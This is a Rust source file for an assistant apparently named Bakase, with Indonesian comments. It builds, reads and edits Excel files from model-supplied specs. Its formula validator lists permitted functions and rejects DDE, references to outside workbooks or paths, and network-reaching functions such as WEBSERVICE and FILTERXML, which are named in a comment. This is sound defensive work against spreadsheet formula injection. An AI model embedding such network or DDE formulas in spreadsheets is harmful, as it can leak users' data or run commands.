//! File buatan Bakase (Excel, Word, PowerPoint). File disimpan per user di `data/files/<user>/`,
//! tercatat di tabel `files`, dan hanya bisa diunduh atau dilihat pemiliknya. Lampiran
//! dari user (`attachments.rs`) memakai tabel dan folder yang sama.
//!
//! Model tidak menulis file sendiri: model mengirim isi terstruktur, server
//! yang membuat filenya. Spesifikasi yang sama dipakai untuk preview di browser.

use crate::{AppState, acl::AuthUser, db::Db, error::ApiError};
use axum::{
    Json,
    extract::{Path, State},
    http::header,
    response::{IntoResponse, Response},
};
use rust_xlsxwriter::{Color, ExcelDateTime, Format, FormatBorder, Formula, Workbook, Worksheet};
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};
use std::sync::atomic::{AtomicBool, Ordering};
use std::{path::PathBuf, sync::Arc};

#[derive(Debug, Clone, Serialize, PartialEq)]
pub struct FileRef {
    pub id: String,
    pub name: String,
    pub kind: String,
    pub size: i64,
}

// ---------- Excel ----------

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct XlsxSpec {
    pub filename: String,
    pub sheets: Vec<SheetSpec>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct SheetSpec {
    pub name: String,
    pub columns: Vec<ColumnSpec>,
    #[serde(default)]
    pub rows: Vec<Vec<Value>>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct ColumnSpec {
    pub header: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub header_formula: Option<Value>,
    /// teks, angka, desimal, rupiah, persen, atau tanggal.
    #[serde(default)]
    pub format: Option<String>,
    /// Lebar kolom dalam karakter; kosong berarti dihitung dari isinya.
    #[serde(default)]
    pub width: Option<f64>,
}

pub(crate) const MAX_SHEETS: usize = 20;
pub(crate) const MAX_COLUMNS: usize = 60;
pub(crate) const MAX_ROWS: usize = 10_000;
pub const XLSX_MIME: &str = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";

const CELL: &str = r#"["string", "number", "boolean", "null"]"#;

/// Skema tool `read_xlsx`: membaca isi file Excel buatan Bakase di percakapan yang sama,
/// per halaman supaya file besar tidak menghabiskan konteks.
pub fn read_xlsx_tool() -> Value {
    json!({
        "type": "function",
        "name": "read_xlsx",
        "description": "Baca isi lampiran Excel (.xlsx atau .xls) atau file Excel buatan Bakase di percakapan ini. Sel rumus .xlsx menyertakan nilai tersimpan jika masih berlaku. Lampiran .xls hanya berisi nilai tersimpan. Hasilnya per halaman dengan nomor baris Excel; baris 1 adalah header. Kalau ada next_from_row, panggil lagi dengan from_row itu untuk halaman berikutnya.",
        "parameters": {
            "type": "object",
            "properties": {
                "file_id": { "type": "string", "description": "Id file dari riwayat percakapan" },
                "sheet": { "type": "string", "description": "Nama sheet; kosong berarti sheet pertama" },
                "from_row": { "type": "integer", "description": "Baris Excel pertama yang dibaca, minimal 2" }
            },
            "required": ["file_id"]
        }
    })
}

/// Skema tool `edit_xlsx`: perubahan diterapkan server ke isi lengkap file, jadi baris
/// yang tidak dibaca model tetap utuh.
pub fn edit_xlsx_tool() -> Value {
    let cell: Value = serde_json::from_str(CELL).unwrap_or(Value::Null);
    json!({
        "type": "function",
        "name": "edit_xlsx",
        "description": "Ubah lampiran Excel (.xlsx atau .xls) atau file Excel buatan Bakase di percakapan ini. Server menerapkan perubahan ke isi lengkap file lalu membuat versi .xlsx baru. Format asli lampiran (warna, lebar kolom, gabungan sel, grafik) tidak ikut. Sampaikan peringatan rumus dari hasil tool kepada user. Pakai ini untuk mengubah file yang sudah ada, termasuk file besar. Baris 1 adalah header, data mulai baris 2. Rumus tidak menyesuaikan otomatis saat baris disisipkan atau dihapus, jadi perbarui rumus yang terdampak dengan set_cell.",
        "parameters": {
            "type": "object",
            "properties": {
                "file_id": { "type": "string", "description": "Id file dari riwayat percakapan" },
                "filename": { "type": "string", "description": "Nama file versi baru tanpa ekstensi (opsional)" },
                "operations": {
                    "type": "array",
                    "description": "Perubahan, diterapkan berurutan.",
                    "items": {
                        "type": "object",
                        "properties": {
                            "op": { "type": "string", "enum": ["set_cell", "insert_rows", "delete_rows", "add_column", "rename_sheet", "add_sheet", "delete_sheet"] },
                            "sheet": { "type": "string", "description": "Nama sheet yang diubah" },
                            "cell": { "type": "string", "description": "set_cell: alamat sel, misalnya B5 (B1 = header kolom B)" },
                            "value": { "type": cell, "description": "set_cell: nilai baru, wajib diisi; null untuk mengosongkan sel; teks berawalan = adalah rumus" },
                            "before_row": { "type": ["integer", "null"], "description": "insert_rows: wajib diisi; sisipkan sebelum baris ini, null berarti tambah di akhir" },
                            "rows": { "type": "array", "items": { "type": "array", "items": { "type": cell } }, "description": "insert_rows atau add_sheet: isi baris, wajib diisi; add_sheet tanpa data memakai []" },
                            "from_row": { "type": "integer", "description": "delete_rows: baris pertama yang dihapus, minimal 2" },
                            "count": { "type": "integer", "description": "delete_rows: jumlah baris, bawaan 1" },
                            "header": { "type": "string", "description": "add_column: judul kolom baru" },
                            "format": { "type": "string", "enum": ["teks", "angka", "desimal", "rupiah", "persen", "tanggal"] },
                            "values": { "type": "array", "items": { "type": cell }, "description": "add_column: isi kolom mulai baris 2" },
                            "new_name": { "type": "string", "description": "rename_sheet: nama baru" },
                            "name": { "type": "string", "description": "add_sheet: nama sheet baru" },
                            "columns": {
                                "type": "array",
                                "description": "add_sheet: kolom sheet baru",
                                "items": { "type": "object", "properties": { "header": { "type": "string" }, "format": { "type": "string" } }, "required": ["header"] }
                            }
                        },
                        "required": ["op"]
                    }
                }
            },
            "required": ["file_id", "operations"]
        }
    })
}

/// Skema tool `create_xlsx` untuk model.
pub fn xlsx_tool() -> Value {
    json!({
        "type": "function",
        "name": "create_xlsx",
        "description": "Buat file Excel (.xlsx) yang bisa diunduh user. Pakai kalau user minta file Excel, tabel yang bisa diolah, atau rekap angka.",
        "parameters": {
            "type": "object",
            "properties": {
                "filename": { "type": "string", "description": "Nama file tanpa ekstensi, misalnya Rekap Lembur Minggu 46" },
                "sheets": {
                    "type": "array",
                    "description": "Satu atau beberapa sheet.",
                    "items": {
                        "type": "object",
                        "properties": {
                            "name": { "type": "string", "description": "Nama sheet, maksimal 31 karakter, tanpa [ ] : * ? / \\" },
                            "columns": {
                                "type": "array",
                                "items": {
                                    "type": "object",
                                    "properties": {
                                        "header": { "type": "string" },
                                        "format": { "type": "string", "enum": ["teks", "angka", "desimal", "rupiah", "persen", "tanggal"], "description": "persen memakai nilai pecahan (0.25 = 25%); tanggal memakai format YYYY-MM-DD" },
                                        "width": { "type": "number", "description": "Lebar kolom dalam karakter (opsional)" }
                                    },
                                    "required": ["header"]
                                }
                            },
                            "rows": {
                                "type": "array",
                                "description": "Isi baris di bawah header. Teks yang diawali '=' ditulis sebagai rumus Excel, misalnya =SUM(B2:B10). Baris 1 adalah header.",
                                "items": { "type": "array", "items": { "type": ["string", "number", "boolean", "null"] } }
                            }
                        },
                        "required": ["name", "columns", "rows"]
                    }
                }
            },
            "required": ["filename", "sheets"]
        }
    })
}

fn number_format(format: Option<&str>) -> Option<&'static str> {
    match format? {
        "angka" => Some("#,##0"),
        "desimal" => Some("#,##0.00"),
        "rupiah" => Some("\"Rp\" #,##0"),
        "persen" => Some("0.0%"),
        "tanggal" => Some("dd/mm/yyyy"),
        _ => None,
    }
}

/// Memeriksa spesifikasi. Pesan error ditulis untuk model, supaya bisa memperbaiki panggilannya.
pub fn validate_xlsx(spec: &XlsxSpec) -> Result<(), String> {
    if spec.sheets.is_empty() {
        return Err("Minimal satu sheet.".into());
    }
    if spec.sheets.len() > MAX_SHEETS {
        return Err(format!("Maksimal {MAX_SHEETS} sheet."));
    }
    let mut names: Vec<String> = Vec::new();
    for sheet in &spec.sheets {
        let name = sheet.name.trim();
        if name.is_empty() || name.chars().count() > 31 {
            return Err(format!("Nama sheet \"{name}\" harus 1–31 karakter."));
        }
        if name.contains(['[', ']', ':', '*', '?', '/', '\\']) {
            return Err(format!(
                "Nama sheet \"{name}\" tidak boleh memuat [ ] : * ? / \\."
            ));
        }
        if names.iter().any(|n| n.eq_ignore_ascii_case(name)) {
            return Err(format!("Nama sheet \"{name}\" dipakai dua kali."));
        }
        names.push(name.to_string());
        if sheet.columns.is_empty() || sheet.columns.len() > MAX_COLUMNS {
            return Err(format!(
                "Sheet \"{name}\" harus punya 1–{MAX_COLUMNS} kolom."
            ));
        }
        if sheet.rows.len() > MAX_ROWS {
            return Err(format!("Sheet \"{name}\" maksimal {MAX_ROWS} baris."));
        }
        for column in &sheet.columns {
            if let Some(value) = &column.header_formula {
                let formula = stored_formula(value).ok_or("Rumus header tidak valid.")?;
                check_formula(formula)?;
            }
        }
        for (i, row) in sheet.rows.iter().enumerate() {
            if row.len() > sheet.columns.len() {
                return Err(format!(
                    "Baris {} di sheet \"{name}\" punya {} nilai, padahal kolomnya {}.",
                    i + 2,
                    row.len(),
                    sheet.columns.len()
                ));
            }
            if row
                .iter()
                .any(|v| (v.is_object() || v.is_array()) && stored_formula(v).is_none())
            {
                return Err(format!(
                    "Baris {} di sheet \"{name}\": isi sel harus teks, angka, benar/salah, atau kosong.",
                    i + 2
                ));
            }
            for (c, value) in row.iter().enumerate() {
                if let Some(formula) =
                    stored_formula(value).or_else(|| as_formula(value, &sheet.columns[c]))
                {
                    check_formula(formula).map_err(|msg| {
                        format!("Rumus di sheet \"{name}\" baris {}: {msg}", i + 2)
                    })?;
                }
            }
        }
    }
    Ok(())
}

/// Fungsi Excel yang boleh dipakai di rumus buatan model. Fungsi yang bisa menghubungi
/// jaringan atau file lain (WEBSERVICE, HYPERLINK, INDIRECT, FILTERXML, ...) sengaja tidak ada.
const ALLOWED_FUNCTIONS: &[&str] = &[
    "ABS",
    "AND",
    "AVERAGE",
    "AVERAGEIF",
    "AVERAGEIFS",
    "CEILING",
    "CHOOSE",
    "COLUMN",
    "COLUMNS",
    "CONCAT",
    "CONCATENATE",
    "COUNT",
    "COUNTA",
    "COUNTBLANK",
    "COUNTIF",
    "COUNTIFS",
    "DATE",
    "DATEDIF",
    "DAY",
    "DAYS",
    "EDATE",
    "EOMONTH",
    "FLOOR",
    "HLOOKUP",
    "HOUR",
    "IF",
    "IFERROR",
    "IFNA",
    "IFS",
    "INDEX",
    "INT",
    "ISBLANK",
    "ISERROR",
    "ISNUMBER",
    "ISTEXT",
    "LARGE",
    "LEFT",
    "LEN",
    "LOWER",
    "MATCH",
    "MAX",
    "MAXIFS",
    "MEDIAN",
    "MID",
    "MIN",
    "MINIFS",
    "MINUTE",
    "MOD",
    "MONTH",
    "NETWORKDAYS",
    "NOT",
    "NOW",
    "OR",
    "PERCENTILE",
    "POWER",
    "PRODUCT",
    "PROPER",
    "RANK",
    "RIGHT",
    "ROUND",
    "ROUNDDOWN",
    "ROUNDUP",
    "ROW",
    "ROWS",
    "SMALL",
    "SQRT",
    "STDEV",
    "SUBSTITUTE",
    "SUBTOTAL",
    "SUM",
    "SUMIF",
    "SUMIFS",
    "SUMPRODUCT",
    "SWITCH",
    "TEXT",
    "TODAY",
    "TRIM",
    "UPPER",
    "VALUE",
    "VLOOKUP",
    "WEEKDAY",
    "WEEKNUM",
    "WORKDAY",
    "XLOOKUP",
    "YEAR",
];

/// Nilai sel yang akan ditulis sebagai rumus: teks berawalan `=`, kecuali di kolom
/// bertipe teks (di sana `=` tetap teks biasa).
fn as_formula<'a>(value: &'a Value, column: &ColumnSpec) -> Option<&'a str> {
    match value {
        Value::String(s)
            if s.len() > 1 && s.starts_with('=') && column.format.as_deref() != Some("teks") =>
        {
            Some(s)
        }
        _ => None,
    }
}

/// Rumus hanya boleh memakai fungsi di `ALLOWED_FUNCTIONS` dan sel di workbook ini:
/// tanpa DDE (`|`), tanpa referensi ke workbook atau path lain.
pub(crate) fn check_formula(formula: &str) -> Result<(), String> {
    if formula.chars().count() > 2000 {
        return Err("rumus terlalu panjang.".into());
    }
    // Teks dalam tanda kutip dibuang dulu. Isi "..." hanya teks biasa; isi '...' adalah
    // nama sheet, yang tidak boleh memuat karakter path atau workbook lain.
    let mut code = String::new();
    let mut chars = formula[1..].chars().peekable();
    while let Some(ch) = chars.next() {
        match ch {
            '"' | '\'' => {
                let mut quoted = String::new();
                while let Some(next) = chars.next() {
                    if next == ch {
                        if chars.peek() == Some(&ch) {
                            chars.next();
                            quoted.push(ch);
                            continue;
                        }
                        break;
                    }
                    quoted.push(next);
                }
                if ch == '\'' && quoted.contains(['[', ']', '\\', '/', ':']) {
                    return Err("rumus tidak boleh merujuk workbook atau file lain.".into());
                }
                code.push(' ');
            }
            _ => code.push(ch),
        }
    }
    if code.contains(['|', '[', ']', '\\']) {
        return Err("rumus tidak boleh merujuk workbook lain, file, atau DDE.".into());
    }
    if !code.is_ascii() {
        return Err(
            "di luar teks berkutip, rumus hanya boleh memakai huruf dan simbol biasa.".into(),
        );
    }
    // Baris baru atau tab bisa menyembunyikan pemanggilan fungsi (`WEBSERVICE↵(...)`).
    if code.chars().any(|c| c.is_control()) {
        return Err("rumus tidak boleh memuat baris baru atau karakter kontrol.".into());
    }
    // Hasil ekspresi tidak boleh dipanggil seperti fungsi, misalnya IF(...)(...).
    if code.replace(' ', "").contains(")(") {
        return Err("rumus tidak boleh memanggil hasil ekspresi.".into());
    }
    let bytes = code.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i].is_ascii_alphabetic() || bytes[i] == b'_' {
            let start = i;
            while i < bytes.len() && (bytes[i].is_ascii_alphanumeric() || b"_.".contains(&bytes[i]))
            {
                i += 1;
            }
            let mut j = i;
            while j < bytes.len() && bytes[j] == b' ' {
                j += 1;
            }
            let called = j < bytes.len() && bytes[j] == b'(';
            let ident = code[start..i].to_ascii_uppercase();
            // Nama berprefiks `_` atau bertitik (`_xleta.`, `_xlws.`, ...) bisa merujuk fungsi
            // sebagai nilai. Yang boleh hanya `_xlfn.` di depan fungsi yang diizinkan.
            let name = match ident.strip_prefix("_XLFN.") {
                Some(rest) if called => rest,
                _ if ident.starts_with('_') || ident.contains('.') => {
                    return Err(format!("nama {ident} tidak diizinkan di rumus."));
                }
                _ => ident.as_str(),
            };
            if called && !ALLOWED_FUNCTIONS.contains(&name) {
                return Err(format!(
                    "fungsi {name} tidak diizinkan. Pakai fungsi umum seperti SUM, AVERAGE, IF, COUNTIF, VLOOKUP, atau ROUND."
                ));
            }
        } else {
            i += 1;
        }
    }
    Ok(())
}

/// Semua bagian rumus di luar teks berkutip dijadikan huruf besar. Penulis xlsx hanya
/// mengenali fungsi baru (XLOOKUP, IFS, ...) dalam huruf besar untuk diberi prefiks `_xlfn.`;
/// referensi sel dan nama sheet di Excel tidak membedakan huruf besar-kecil.
fn normalize_formula(formula: &str) -> String {
    let mut out = String::with_capacity(formula.len());
    let mut quote: Option<char> = None;
    for ch in formula.chars() {
        match quote {
            Some(q) => {
                out.push(ch);
                if ch == q {
                    quote = None;
                }
            }
            None if ch == '"' || ch == '\'' => {
                out.push(ch);
                quote = Some(ch);
            }
            None => out.push(ch.to_ascii_uppercase()),
        }
    }
    out
}

pub fn build_xlsx(spec: &XlsxSpec) -> Result<Vec<u8>, String> {
    validate_xlsx(spec)?;
    let mut workbook = Workbook::new();
    let header = Format::new()
        .set_bold()
        .set_background_color(Color::RGB(0xF2F2F2))
        .set_border_bottom(FormatBorder::Thin);
    for sheet in &spec.sheets {
        let ws = workbook.add_worksheet();
        write_sheet(ws, sheet, &header).map_err(|e| format!("Sheet \"{}\": {e}", sheet.name))?;
    }
    workbook
        .save_to_buffer()
        .map_err(|e| format!("Gagal menyimpan Excel: {e}"))
}

fn is_formula_text(value: &Value) -> bool {
    matches!(value, Value::String(s) if s.len() > 1 && s.starts_with('='))
}

pub(crate) fn stored_formula(value: &Value) -> Option<&str> {
    let formula = value.get("formula")?.as_str()?;
    let cached = value.get("value")?;
    (formula.len() > 1 && formula.starts_with('=') && !cached.is_object() && !cached.is_array())
        .then_some(formula)
}

fn imported_formula(value: &Value, formula: &str) -> Formula {
    let formula = Formula::new(formula);
    match value
        .get("cache")
        .filter(|v| v.is_number())
        .unwrap_or(&value["value"])
    {
        Value::Null => formula,
        Value::String(s) => formula.set_result(s),
        cached => formula.set_result(cached.to_string().to_ascii_uppercase()),
    }
}

fn write_sheet(
    ws: &mut Worksheet,
    sheet: &SheetSpec,
    header: &Format,
) -> Result<(), rust_xlsxwriter::XlsxError> {
    ws.set_name(sheet.name.trim())?;
    let formats: Vec<Format> = sheet
        .columns
        .iter()
        .map(|c| match number_format(c.format.as_deref()) {
            Some(f) => Format::new().set_num_format(f),
            None => Format::new(),
        })
        .collect();
    for (c, col) in sheet.columns.iter().enumerate() {
        let c16 = c as u16;
        if let Some((value, formula)) = col
            .header_formula
            .as_ref()
            .and_then(|v| Some((v, stored_formula(v)?)))
        {
            ws.write_formula_with_format(0, c16, imported_formula(value, formula), header)?;
        } else {
            ws.write_string_with_format(0, c16, &col.header, header)?;
        }
        let widest = sheet
            .rows
            .iter()
            .filter_map(|r| r.get(c))
            .map(|v| match v {
                Value::String(s) if s.starts_with('=') => 12,
                Value::String(s) => s.chars().count(),
                Value::Number(n) => n.to_string().len() + 3,
                _ => 6,
            })
            .chain([col.header.chars().count() + 2])
            .max()
            .unwrap_or(10);
        let width = col.width.unwrap_or(widest as f64).clamp(6.0, 60.0);
        ws.set_column_width(c16, width)?;
    }
    for (r, row) in sheet.rows.iter().enumerate() {
        let r32 = r as u32 + 1;
        for (c, value) in row.iter().enumerate() {
            let c16 = c as u16;
            let fmt = &formats[c];
            let is_date = sheet.columns[c].format.as_deref() == Some("tanggal");
            match value {
                Value::Null => {}
                Value::Bool(b) => {
                    ws.write_boolean(r32, c16, *b)?;
                }
                Value::Number(n) => {
                    ws.write_number_with_format(r32, c16, n.as_f64().unwrap_or(0.0), fmt)?;
                }
                Value::String(_) if as_formula(value, &sheet.columns[c]).is_some() => {
                    let formula = as_formula(value, &sheet.columns[c]).unwrap_or_default();
                    let formula = Formula::new(normalize_formula(formula));
                    ws.write_formula_with_format(r32, c16, formula, fmt)?;
                }
                Value::String(s) => match ExcelDateTime::parse_from_str(s) {
                    Ok(dt) if is_date => {
                        ws.write_datetime_with_format(r32, c16, &dt, fmt)?;
                    }
                    _ => {
                        ws.write_string_with_format(r32, c16, s, fmt)?;
                    }
                },
                other => {
                    let formula = stored_formula(other).expect("rumus sudah divalidasi");
                    ws.write_formula_with_format(r32, c16, imported_formula(other, formula), fmt)?;
                }
            }
        }
    }
    ws.set_freeze_panes(1, 0)?;
    if !sheet.rows.is_empty() {
        ws.autofilter(
            0,
            0,
            sheet.rows.len() as u32,
            sheet.columns.len() as u16 - 1,
        )?;
    }
    Ok(())
}

/// Nama file yang aman dipakai di Windows; ekstensi ditambahkan terpisah.
pub fn safe_name(name: &str) -> String {
    let cleaned: String = name
        .chars()
        .map(|c| {
            if c.is_control() || "<>:\"/\\|?*".contains(c) {
                ' '
            } else {
                c
            }
        })
        .collect();
    let cleaned = cleaned.split_whitespace().collect::<Vec<_>>().join(" ");
    let cleaned: String = cleaned.trim_matches('.').chars().take(100).collect();
    if cleaned.is_empty() {
        "Bakase".into()
    } else {
        cleaned
    }
}

// ---------- membaca dan mengubah file yang sudah ada ----------

/// Indeks kolom 0-based dari huruf kolom Excel ("A" → 0, "AA" → 26).
fn column_index(letters: &str) -> Option<usize> {
    if letters.is_empty() || letters.len() > 3 || !letters.bytes().all(|b| b.is_ascii_alphabetic())
    {
        return None;
    }
    Some(rust_xlsxwriter::column_name_to_number(&letters.to_ascii_uppercase()).into())
}

/// Huruf kolom Excel dari indeks 0-based (0 → "A", 26 → "AA").
pub fn column_letter(index: usize) -> String {
    // `column_number_to_name` menambah 1 sebelum melebarkan tipe, jadi u16::MAX meluap.
    rust_xlsxwriter::ColNum::try_from(index)
        .ok()
        .filter(|&col| col < rust_xlsxwriter::ColNum::MAX)
        .map(rust_xlsxwriter::column_number_to_name)
        .unwrap_or_default()
}

/// Alamat sel Excel ke (indeks kolom, nomor baris Excel): "B5" → (1, 5).
fn parse_cell(address: &str) -> Option<(usize, usize)> {
    let address = address.trim().replace('$', "");
    let split = address.find(|c: char| c.is_ascii_digit())?;
    let (letters, digits) = address.split_at(split);
    let row: usize = digits.parse().ok()?;
    (row >= 1).then_some((column_index(letters)?, row))
}

fn one() -> usize {
    1
}

/// Satu perubahan dari tool `edit_xlsx`. Nomor baris memakai nomor baris Excel.
#[derive(Debug, Deserialize)]
#[serde(tag = "op", rename_all = "snake_case")]
pub enum EditOp {
    SetCell {
        sheet: String,
        cell: String,
        /// Wajib ada supaya sel tidak terhapus diam-diam kalau model lupa mengisinya;
        /// `null` yang dikirim sengaja tetap mengosongkan sel.
        value: Value,
    },
    InsertRows {
        sheet: String,
        /// Wajib ada (`null` = tambah di akhir), supaya posisi yang terlewat tidak membuat
        /// baris masuk di akhir lalu operasi berikutnya mengenai baris yang salah.
        #[serde(deserialize_with = "Option::deserialize")]
        before_row: Option<usize>,
        rows: Vec<Vec<Value>>,
    },
    DeleteRows {
        sheet: String,
        from_row: usize,
        #[serde(default = "one")]
        count: usize,
    },
    AddColumn {
        sheet: String,
        header: String,
        #[serde(default)]
        format: Option<String>,
        #[serde(default)]
        values: Vec<Value>,
    },
    RenameSheet {
        sheet: String,
        new_name: String,
    },
    AddSheet {
        name: String,
        columns: Vec<ColumnSpec>,
        /// Wajib ada (`[]` = tanpa data), supaya data yang dipindah tidak hilang kalau model
        /// lupa mengisinya lalu menghapus sheet asal.
        rows: Vec<Vec<Value>>,
    },
    DeleteSheet {
        sheet: String,
    },
}

#[derive(Debug, Deserialize)]
pub struct EditRequest {
    pub file_id: String,
    #[serde(default)]
    pub filename: Option<String>,
    pub operations: Vec<EditOp>,
}

fn same_sheet(a: &str, b: &str) -> bool {
    a.trim().eq_ignore_ascii_case(b.trim())
}

fn sheet_mut<'a>(spec: &'a mut XlsxSpec, name: &str) -> Result<&'a mut SheetSpec, String> {
    let names: Vec<String> = spec.sheets.iter().map(|s| s.name.clone()).collect();
    spec.sheets
        .iter_mut()
        .find(|s| same_sheet(&s.name, name))
        .ok_or_else(|| {
            format!(
                "sheet \"{name}\" tidak ada. Sheet yang ada: {}.",
                names.join(", ")
            )
        })
}

/// Menerapkan perubahan ke isi lengkap file. Hasilnya tetap divalidasi oleh `build_xlsx`.
pub fn apply_edits(mut spec: XlsxSpec, ops: &[EditOp]) -> Result<(XlsxSpec, bool), String> {
    if ops.is_empty() {
        return Err("Tidak ada perubahan.".into());
    }
    let mut row_warning = false;
    for (n, op) in ops.iter().enumerate() {
        let shifts_rows = match op {
            EditOp::InsertRows { rows, .. } => !rows.is_empty(),
            EditOp::DeleteRows { .. } => true,
            _ => false,
        };
        // Sheet lain juga bisa berisi rumus yang merujuk baris ini.
        row_warning = row_warning || (shifts_rows && spec.sheets.iter().any(has_formulas));
        apply_edit(&mut spec, op).map_err(|e| format!("Operasi ke-{}: {e}", n + 1))?;
        row_warning = row_warning || (shifts_rows && spec.sheets.iter().any(has_formulas));
    }
    Ok((spec, row_warning))
}

fn apply_edit(spec: &mut XlsxSpec, op: &EditOp) -> Result<(), String> {
    match op {
        EditOp::SetCell { sheet, cell, value } => {
            let (col, row) = parse_cell(cell)
                .ok_or_else(|| format!("alamat sel \"{cell}\" tidak valid, contohnya B5."))?;
            let s = sheet_mut(spec, sheet)?;
            if col >= s.columns.len() {
                return Err(format!(
                    "kolom {} belum ada; tambahkan dulu dengan add_column.",
                    column_letter(col)
                ));
            }
            if row == 1 {
                let header = &mut s.columns[col];
                if header.header_formula.is_some() && is_formula_text(value) {
                    header.header_formula = Some(json!({ "formula": value, "value": null }));
                    header.header.clear();
                    return Ok(());
                }
                header.header_formula = None;
                s.columns[col].header = match value {
                    Value::String(text) => text.clone(),
                    other => other.to_string(),
                };
                return Ok(());
            }
            let index = row - 2;
            if index >= MAX_ROWS {
                return Err(format!("maksimal {MAX_ROWS} baris."));
            }
            if s.rows.len() <= index {
                s.rows.resize(index + 1, Vec::new());
            }
            let cells = &mut s.rows[index];
            if cells.len() <= col {
                cells.resize(col + 1, Value::Null);
            }
            cells[col] = if stored_formula(&cells[col]).is_some() && is_formula_text(value) {
                json!({ "formula": value, "value": null })
            } else {
                value.clone()
            };
        }
        EditOp::InsertRows {
            sheet,
            before_row,
            rows,
        } => {
            let s = sheet_mut(spec, sheet)?;
            let at = match *before_row {
                None => s.rows.len(),
                Some(r) if r >= 2 && r - 2 <= s.rows.len() => r - 2,
                Some(r) => {
                    return Err(format!(
                        "before_row {r} di luar data; pakai baris 2 sampai {}.",
                        s.rows.len() + 2
                    ));
                }
            };
            s.rows.splice(at..at, rows.iter().cloned());
        }
        EditOp::DeleteRows {
            sheet,
            from_row,
            count,
        } => {
            let s = sheet_mut(spec, sheet)?;
            let (from, count) = (*from_row, *count);
            let end = from
                .checked_sub(2)
                .and_then(|start| start.checked_add(count))
                .filter(|end| count > 0 && *end <= s.rows.len());
            let Some(end) = end else {
                return Err(format!(
                    "baris {from} sampai {} tidak ada; data ada di baris 2 sampai {}.",
                    from.saturating_add(count.max(1) - 1),
                    s.rows.len() + 1
                ));
            };
            s.rows.drain(from - 2..end);
        }
        EditOp::AddColumn {
            sheet,
            header,
            format,
            values,
        } => {
            let s = sheet_mut(spec, sheet)?;
            if values.len() > s.rows.len() {
                return Err(format!(
                    "values punya {} nilai, padahal datanya {} baris.",
                    values.len(),
                    s.rows.len()
                ));
            }
            let col = s.columns.len();
            s.columns.push(ColumnSpec {
                header: header.clone(),
                header_formula: None,
                format: format.clone(),
                width: None,
            });
            for (cells, value) in s.rows.iter_mut().zip(values) {
                cells.resize(col, Value::Null);
                cells.push(value.clone());
            }
        }
        EditOp::RenameSheet { sheet, new_name } => {
            let old = sheet_mut(spec, sheet)?.name.clone();
            let replacement = sheet_ref(new_name);
            // Rentang sheet berkutip ('A:B'!) tidak diizinkan di rumus, jadi nama baru untuk
            // sheet yang menjadi ujung rentang harus bisa ditulis tanpa kutip.
            if replacement.starts_with('\'') {
                let mut in_range = false;
                for_each_formula(spec, |formula| {
                    in_range |= used_in_sheet_range(formula, &old);
                });
                if in_range {
                    return Err(format!(
                        "sheet \"{old}\" dipakai di rujukan rentang sheet (misalnya {old}:Mar!A2), jadi nama barunya harus tanpa spasi atau simbol."
                    ));
                }
            }
            sheet_mut(spec, sheet)?.name = new_name.clone();
            // Rumus yang merujuk sheet ini (Data!B2, 'Data Lama'!B2, Data:Mar!B2) ikut diperbarui.
            for_each_formula(spec, |formula| {
                *formula = replace_sheet_ref(formula, &old, &replacement);
            });
        }
        EditOp::AddSheet {
            name,
            columns,
            rows,
        } => spec.sheets.push(SheetSpec {
            name: name.clone(),
            columns: columns.clone(),
            rows: rows.clone(),
        }),
        EditOp::DeleteSheet { sheet } => {
            if spec.sheets.len() == 1 {
                return Err("sheet terakhir tidak bisa dihapus.".into());
            }
            let index = spec
                .sheets
                .iter()
                .position(|s| same_sheet(&s.name, sheet))
                .ok_or_else(|| format!("sheet \"{sheet}\" tidak ada."))?;
            let name = spec.sheets[index].name.clone();
            let mut referenced = false;
            for (i, other) in spec.sheets.iter().enumerate() {
                if i == index {
                    continue;
                }
                referenced |= other.columns.iter().any(|col| {
                    col.header_formula
                        .as_ref()
                        .and_then(stored_formula)
                        .is_some_and(|f| replace_sheet_ref(f, &name, "#") != f)
                });
                referenced |= other.rows.iter().any(|cells| {
                    cells.iter().enumerate().any(|(c, cell)| match cell {
                        _ if is_formula_cell(other, c, cell) => stored_formula(cell)
                            .or_else(|| cell.as_str())
                            .is_some_and(|f| replace_sheet_ref(f, &name, "#") != f),
                        _ => false,
                    })
                });
            }
            if referenced {
                return Err(format!(
                    "rumus di sheet lain masih merujuk sheet \"{name}\"; ubah rumusnya dulu dengan set_cell."
                ));
            }
            spec.sheets.remove(index);
        }
    }
    Ok(())
}

/// Sel yang akan ditulis sebagai rumus (aturan yang sama dengan `as_formula`).
fn is_formula_cell(sheet: &SheetSpec, col: usize, cell: &Value) -> bool {
    if stored_formula(cell).is_some() {
        return true;
    }
    match sheet.columns.get(col) {
        Some(column) => as_formula(cell, column).is_some(),
        None => is_formula_text(cell),
    }
}

fn has_formulas(sheet: &SheetSpec) -> bool {
    sheet.columns.iter().any(|col| col.header_formula.is_some())
        || sheet.rows.iter().any(|row| {
            row.iter()
                .enumerate()
                .any(|(col, cell)| is_formula_cell(sheet, col, cell))
        })
}

pub(crate) fn show_pending_recalculation(spec: &mut XlsxSpec) {
    let display = |formula: &str| format!("{formula} (dihitung ulang saat dibuka di Excel)");
    for sheet in &mut spec.sheets {
        for col in &mut sheet.columns {
            if let Some(formula) = col.header_formula.take()
                && let Some(text) = stored_formula(&formula)
            {
                col.header = display(text);
            }
        }
        for row in &mut sheet.rows {
            for (col, cell) in row.iter_mut().enumerate() {
                let formula = stored_formula(cell).or_else(|| match sheet.columns.get(col) {
                    Some(column) => as_formula(cell, column),
                    None => cell.as_str().filter(|_| is_formula_text(cell)),
                });
                if let Some(formula) = formula {
                    *cell = json!(display(formula));
                }
            }
        }
    }
}

fn for_each_formula(spec: &mut XlsxSpec, mut f: impl FnMut(&mut String)) {
    for sheet in &mut spec.sheets {
        for column in &mut sheet.columns {
            if let Some(Value::String(formula)) = column
                .header_formula
                .as_mut()
                .and_then(|v| v.get_mut("formula"))
            {
                f(formula);
            }
        }
        let formula_cells: Vec<(usize, usize)> = sheet
            .rows
            .iter()
            .enumerate()
            .flat_map(|(r, cells)| cells.iter().enumerate().map(move |(c, cell)| (r, c, cell)))
            .filter(|(_, c, cell)| is_formula_cell(sheet, *c, cell))
            .map(|(r, c, _)| (r, c))
            .collect();
        for (r, c) in formula_cells {
            let cell = &mut sheet.rows[r][c];
            let formula = if cell.is_object() {
                cell.get_mut("formula")
